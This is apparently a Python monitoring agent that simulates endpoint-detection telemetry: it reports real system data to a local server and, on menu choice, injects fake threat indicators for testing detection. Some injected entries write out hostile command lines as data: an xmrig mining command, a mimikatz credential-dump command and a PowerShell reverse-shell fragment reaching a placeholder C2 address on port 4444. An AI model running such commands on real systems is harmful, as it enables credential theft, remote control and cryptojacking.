import os
import sys
import time
import json
import uuid
import socket
import platform
import threading
import subprocess
import csv
import urllib.request
import urllib.error
import psutil
from typing import List, Dict, Any

# Target Server URL
SERVER_URL = "http://localhost:8000/api/workstations/report"

# Simulation Mode Settings
# 1 = Normal, 2 = Cryptominer CPU Spike, 3 = Mimikatz, 4 = Reverse Shell, 5 = Hak5 Rubber Ducky USB, 6 = Unauthorized USB Storage, 7 = RDP Admin Login
current_mode = 1
mode_names = {
    1: "Normal Monitoring (Real System Telemetry)",
    2: "Simulation: Cryptomining Attack (95% CPU Spike)",
    3: "Simulation: Suspicious Process Run (mimikatz.exe)",
    4: "Simulation: Active Reverse Shell (Connection to port 4444)",
    5: "Simulation: Malicious USB Connected (Hak5 Rubber Ducky)",
    6: "Simulation: Unauthorized Mass Storage Connected (SanDisk USB Drive)",
    7: "Simulation: Remote Admin Login Alert (Administrator via RDP)"
}

lock = threading.Lock()
running = True

def get_mac_address() -> str:
    """Returns the formatted MAC address of the system."""
    try:
        mac_num = uuid.getnode()
        mac = ':'.join(['{:02x}'.format((mac_num >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
        return mac.upper()
    except Exception:
        return "00:00:00:00:00:00"

def get_local_ip() -> str:
    """Gets the active local IP address."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.254.254.254', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def get_real_memory_load() -> float:
    """Obtains real memory usage percentage via psutil."""
    try:
        return psutil.virtual_memory().percent
    except Exception:
        return 45.5

def get_real_disk_usage() -> float:
    """Obtains real disk usage percentage via psutil."""
    try:
        return psutil.disk_usage('.').percent
    except Exception:
        return 23.4

def get_real_cpu_usage() -> float:
    """Obtains CPU usage via psutil."""
    try:
        return psutil.cpu_percent(interval=0.1)
    except Exception:
        import random
        return round(5.0 + random.random() * 8.0, 1)

def get_real_processes() -> List[Dict[str, Any]]:
    """Gathers running processes on the system using psutil."""
    processes = []
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            cmdline = proc.info.get('cmdline')
            processes.append({
                "pid": proc.info['pid'],
                "name": proc.info['name'] or "unknown",
                "command_line": " ".join(cmdline) if cmdline else ""
            })
    except Exception:
        pass
    
    if not processes:
        processes = [
            {"pid": 4, "name": "System", "command_line": ""},
            {"pid": 920, "name": "svchost.exe", "command_line": ""}
        ]
    return processes

def get_real_connections() -> List[Dict[str, Any]]:
    """Gathers active TCP network connections using psutil."""
    conns = []
    try:
        for conn in psutil.net_connections(kind='tcp'):
            if conn.status == psutil.CONN_LISTEN:
                remote_ip = "0.0.0.0"
                remote_port = 0
            else:
                remote_ip = conn.raddr.ip if conn.raddr else "0.0.0.0"
                remote_port = conn.raddr.port if conn.raddr else 0
                
            conns.append({
                "protocol": "TCP",
                "local_ip": conn.laddr.ip if conn.laddr else "127.0.0.1",
                "local_port": conn.laddr.port if conn.laddr else 0,
                "remote_ip": remote_ip,
                "remote_port": remote_port,
                "state": conn.status
            })
    except Exception:
        pass
            
    if not conns:
        conns = [
            {"protocol": "TCP", "local_ip": "127.0.0.1", "local_port": 8000, "remote_ip": "0.0.0.0", "remote_port": 0, "state": "LISTEN"}
        ]
    return conns[:25]

def get_logged_in_users() -> List[Dict[str, Any]]:
    """Gathers logged in users using psutil."""
    users = []
    try:
        for user in psutil.users():
            users.append({
                "username": user.name,
                "session_type": "Terminal" if user.terminal else "Console",
                "login_time": "Active Session"
            })
    except Exception:
        pass
        
    if not users:
        try:
            username = os.getlogin()
        except Exception:
            username = os.environ.get("USERNAME", os.environ.get("USER", "workstation-user"))
        users = [{"username": username, "session_type": "Console/Local", "login_time": "Active Session"}]
        
    return users

def get_usb_devices() -> List[Dict[str, Any]]:
    """Returns basic USB devices attached (keyboard, mouse)."""
    return [
        {"device_id": "USB\\VID_046D&PID_C077", "description": "Logitech USB Optical Mouse", "class": "Mouse"},
        {"device_id": "USB\\VID_413C&PID_2107", "description": "Dell QuietKey USB Keyboard", "class": "Keyboard"}
    ]

def get_os_info() -> str:
    """Gets operating system description."""
    return f"{platform.system()} {platform.release()} (Build {platform.version()})"

def get_update_status() -> dict:
    """Checks OS patch/update status. Works on Windows and Linux."""
    try:
        system = platform.system()
        if system == "Windows":
            # Query the most recent installed hotfix via PowerShell
            result = subprocess.run(
                [
                    "powershell", "-NoProfile", "-Command",
                    "Get-HotFix | Sort-Object InstalledOn -Descending -ErrorAction SilentlyContinue | Select-Object -First 1 | ConvertTo-Json"
                ],
                capture_output=True,
                text=True,
                timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            )
            if result.returncode == 0 and result.stdout.strip():
                import json as _json
                patch_data = _json.loads(result.stdout.strip())
                hotfix_id = patch_data.get("HotFixID", "Unknown")
                installed_raw = str(patch_data.get("InstalledOn", ""))
                # Check age: warn if last patch is older than 60 days
                import datetime as _dt
                try:
                    # InstalledOn from PowerShell comes as a /Date(ms)/ string or ISO format
                    if "/Date(" in installed_raw:
                        ms = int(installed_raw.replace("/Date(", "").replace(")/", "").split(")")[0])
                        installed_date = _dt.datetime.fromtimestamp(ms / 1000)
                    else:
                        installed_date = _dt.datetime.fromisoformat(installed_raw[:19])
                    days_since = (_dt.datetime.now() - installed_date).days
                    is_current = days_since <= 60
                    installed_str = installed_date.strftime("%Y-%m-%d")
                except Exception:
                    days_since = -1
                    is_current = None
                    installed_str = installed_raw
                return {
                    "os_family": "Windows",
                    "last_patch_id": hotfix_id,
                    "last_patch_date": installed_str,
                    "days_since_patch": days_since,
                    "is_current": is_current,
                    "pending_updates": None  # Would need WSUS/WUA COM API for pending count
                }
        elif system == "Linux":
            # Try apt (Debian/Ubuntu)
            result = subprocess.run(
                ["apt-get", "-s", "upgrade"],
                capture_output=True, text=True, timeout=15
            )
            if result.returncode == 0:
                pending = sum(1 for line in result.stdout.split("\n") if line.startswith("Inst "))
                return {
                    "os_family": "Linux",
                    "last_patch_id": "N/A",
                    "last_patch_date": "N/A",
                    "days_since_patch": -1,
                    "is_current": pending == 0,
                    "pending_updates": pending
                }
            # Try dnf/yum (RHEL/Fedora)
            result = subprocess.run(
                ["dnf", "check-update", "--quiet"],
                capture_output=True, text=True, timeout=15
            )
            pending = len([l for l in result.stdout.split("\n") if l.strip() and not l.startswith(" ")])
            return {
                "os_family": "Linux",
                "last_patch_id": "N/A",
                "last_patch_date": "N/A",
                "days_since_patch": -1,
                "is_current": pending == 0,
                "pending_updates": pending
            }
    except Exception as e:
        pass
    # Fallback: unknown
    return {
        "os_family": platform.system(),
        "last_patch_id": "Unknown",
        "last_patch_date": "Unknown",
        "days_since_patch": -1,
        "is_current": None,
        "pending_updates": None
    }

def telemetry_loop():
    """Background thread loop that posts telemetry to the Recon NDS server."""
    global current_mode, running
    
    my_mac = get_mac_address()
    my_ip = get_local_ip()
    my_hostname = socket.gethostname()
    
    print(f"\n[*] Background Telemetry Thread Active.")
    print(f"[*] Monitoring Host: {my_hostname} | IP: {my_ip} | MAC: {my_mac}\n")
    
    while running:
        with lock:
            mode = current_mode
            
        try:
            # 1. Gather baseline telemetry
            cpu = get_real_cpu_usage()
            ram = get_real_memory_load()
            disk = get_real_disk_usage()
            processes = get_real_processes()
            connections = get_real_connections()
            users = get_logged_in_users()
            usbs = get_usb_devices()
            os_details = get_os_info()
            update_status = get_update_status()
            
            # 2. Inject threat payloads based on active simulation mode
            if mode == 2:
                # Cryptomining spike
                cpu = 95.8
                processes.insert(0, {"pid": 9924, "name": "xmrig.exe", "command_line": "--donate-level 1 -o pool.supportxmr.com:5555"})
                processes.insert(1, {"pid": 9925, "name": "cryptominer_worker", "command_line": ""})
            elif mode == 3:
                # Mimikatz credential dumper
                processes.insert(0, {
                    "pid": 8844, 
                    "name": "mimikatz.exe", 
                    "command_line": "privilege::debug sekurlsa::logonpasswords exit"
                })
            elif mode == 4:
                # Reverse Shell Connection
                connections.insert(0, {
                    "protocol": "TCP",
                    "local_ip": my_ip,
                    "local_port": 50431,
                    "remote_ip": "192.168.1.200",  # Fake external C2 IP
                    "remote_port": 4444,           # Suspicious Port
                    "state": "ESTABLISHED"
                })
                processes.insert(0, {
                    "pid": 7112,
                    "name": "cmd.exe",
                    "command_line": "cmd.exe /c powershell -nop -w hidden -c $c=New-Object System.Net.Sockets.TCPClient('192.168.1.200',4444)"
                })
            elif mode == 5:
                # Hak5 Rubber Ducky USB Injection
                usbs.insert(0, {
                    "device_id": "USB\\VID_03EB&PID_2403",
                    "description": "Hak5 Rubber Ducky Keystroke Injector",
                    "class": "HID"
                })
            elif mode == 6:
                # Unauthorized USB Mass Storage
                usbs.insert(0, {
                    "device_id": "USB\\VID_0781&PID_5581",
                    "description": "SanDisk Cruzer Dial USB Mass Storage",
                    "class": "MassStorage"
                })
            elif mode == 7:
                # Remote Administrator session active
                users.append({
                    "username": "Administrator",
                    "session_type": "Remote RDP",
                    "login_time": "Logged in via RDP"
                })
                connections.insert(0, {
                    "protocol": "TCP",
                    "local_ip": my_ip,
                    "local_port": 3389,
                    "remote_ip": "10.0.4.88",
                    "remote_port": 49214,
                    "state": "ESTABLISHED"
                })
            
            # 3. Construct report object
            payload = {
                "ip": my_ip,
                "mac": my_mac,
                "hostname": my_hostname,
                "cpu_usage": cpu,
                "ram_usage": ram,
                "disk_usage": disk,
                "running_processes": processes,
                "network_connections": connections,
                "logged_in_users": users,
                "usb_devices": usbs,
                "os_info": os_details,
                "update_status": update_status
            }
            
            # 4. Transmit payload to server via urllib
            req = urllib.request.Request(
                SERVER_URL,
                data=json.dumps(payload).encode('utf-8'),
                headers={'Content-Type': 'application/json'},
                method='POST'
            )
            
            with urllib.request.urlopen(req, timeout=3) as response:
                resp_data = json.loads(response.read().decode())
                # Success output
                # print(f"[*] Sent telemetry report. Server response: {resp_data}")
                pass
                
        except urllib.error.URLError as e:
            print(f"[!] Network Report Error: Cannot reach server at {SERVER_URL}. (Is uvicorn running?)")
        except Exception as e:
            print(f"[!] Error gathering/sending telemetry: {e}")
            
        time.sleep(4)

def print_menu():
    print("\n" + "="*70)
    print("      RECON NDS - WORKSTATION MONITORING AGENT (EDR SIMULATOR)      ")
    print("="*70)
    print(f"Current Simulation Mode: {mode_names[current_mode]}")
    print("-"*70)
    print("Select simulation telemetry state:")
    print("  1 - Normal Activity (No Threats - Real System Telemetry)")
    print("  2 - Simulate Cryptomining Attack (95% CPU spike + xmrig.exe)")
    print("  3 - Simulate Suspicious Hacking Process (runs mimikatz.exe)")
    print("  4 - Simulate Active Reverse Shell Backdoor (TCP connection on port 4444)")
    print("  5 - Simulate Malicious Keystroke Injector USB (Hak5 Rubber Ducky connected)")
    print("  6 - Simulate Unauthorized USB Mass Storage Drive (SanDisk Drive connected)")
    print("  7 - Simulate Suspicious Administrator RDP session active")
    print("  q - Terminate Agent")
    print("-"*70)
    print("Press [1-7, q] and hit Enter to change simulation state:")

if __name__ == "__main__":
    # Start background loop
    t = threading.Thread(target=telemetry_loop, daemon=True)
    t.start()
    
    try:
        while True:
            print_menu()
            choice = input(">> ").strip()
            
            if choice.lower() == 'q':
                print("[*] Terminating telemetry agent.")
                running = False
                break
            elif choice in ('1', '2', '3', '4', '5', '6', '7'):
                new_m = int(choice)
                with lock:
                    current_mode = new_m
                print(f"\n[+] Successfully switched mode to: {mode_names[new_m]}")
                time.sleep(1)
            else:
                print("\n[!] Invalid option. Please select 1-7 or q.")
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Exiting agent script.")
        running = False
